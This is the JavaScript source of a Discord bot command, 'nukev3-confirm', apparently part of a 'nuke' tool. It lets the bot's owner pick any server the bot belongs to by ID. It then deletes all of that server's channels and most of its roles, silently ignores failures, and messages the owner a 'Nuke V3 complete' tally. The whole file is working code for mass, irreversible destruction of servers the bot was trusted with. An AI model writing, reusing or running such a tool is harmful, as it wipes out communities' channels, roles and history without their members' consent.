import { ChannelType, EmbedBuilder } from 'discord.js';
import { botConfig } from '../../config/botConfig.js';
import { logger } from '../../utils/logger.js';

const THREAD_TYPES = new Set([
    ChannelType.PublicThread,
    ChannelType.PrivateThread,
    ChannelType.AnnouncementThread,
]);

export default {
    name: 'nukev3-confirm',
    async execute(interaction, client, args) {
        if (!botConfig.commands.owners.includes(interaction.user.id)) {
            return interaction.reply({ content: '❌ Only the bot owner can confirm this.', ephemeral: true });
        }

        const guildId = args[0];
        let guild = client.guilds.cache.get(guildId) ?? await client.guilds.fetch(guildId).catch(() => null);
        if (!guild) return interaction.reply({ content: '❌ Could not find the server.', ephemeral: true });

        await interaction.update({ components: [] });

        await guild.channels.fetch().catch(() => {});
        await guild.roles.fetch().catch(() => {});

        const botMember = await guild.members.fetch(client.user.id).catch(() => null);
        const botTopRole = botMember?.roles.highest;

        const channels = [...guild.channels.cache.values()].filter(c => !THREAD_TYPES.has(c.type));
        const roles = [...guild.roles.cache.values()].filter(r => !r.managed && r.id !== guild.id);

        let channelsDeleted = 0;
        let rolesDeleted = 0;

        for (const channel of channels) {
            await channel.delete('Nuke v3').catch(() => {});
            channelsDeleted++;
        }

        for (const role of roles) {
            if (botTopRole && role.position >= botTopRole.position) continue;
            await role.delete('Nuke v3').catch(() => {});
            rolesDeleted++;
        }

        logger.warn(`NUKEV3 by ${interaction.user.tag} (${interaction.user.id}) on "${guild.name}" (${guild.id}) — channels: ${channelsDeleted}, roles: ${rolesDeleted}`);

        const summary = `💥 **Nuke V3 complete** on **${guild.name}** (\`${guild.id}\`)\n\n📁 Deleted: **${channelsDeleted}** channels\n🎭 Deleted: **${rolesDeleted}** roles`;
        await interaction.user.send({
            embeds: [new EmbedBuilder().setColor(0xED4245).setDescription(summary).setTimestamp()],
        }).catch(() => {});
    },
};
